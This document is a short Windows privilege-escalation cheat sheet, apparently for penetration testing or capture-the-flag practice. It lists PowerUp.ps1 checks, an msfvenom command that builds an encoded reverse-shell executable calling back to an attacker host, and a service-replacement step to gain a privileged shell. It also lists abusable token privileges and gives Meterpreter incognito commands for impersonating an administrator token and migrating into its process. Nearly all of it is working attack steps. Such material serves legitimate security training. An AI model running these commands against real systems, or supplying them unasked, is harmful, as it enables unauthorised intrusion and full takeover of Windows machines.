# Windows Privilege Escalation

## PowerUp.ps1
- Dot source the script and launch checks
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

- Look for CanRestart=True and modifiable executable services

- Generate an exe payload with MSFVenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -e x86/shikata_ga_nai -f exe -o file.exe
```

- Upload the payload and restart the service to get root shell

## Token Impersonation

### Check current user privileges
```
whoami /priv
```
### Look for abusable privileges
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

### Meterpreter Incognito module
```sh
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrator"
# Search for a process running under the same account that has been impersonated
ps
migrate pid
```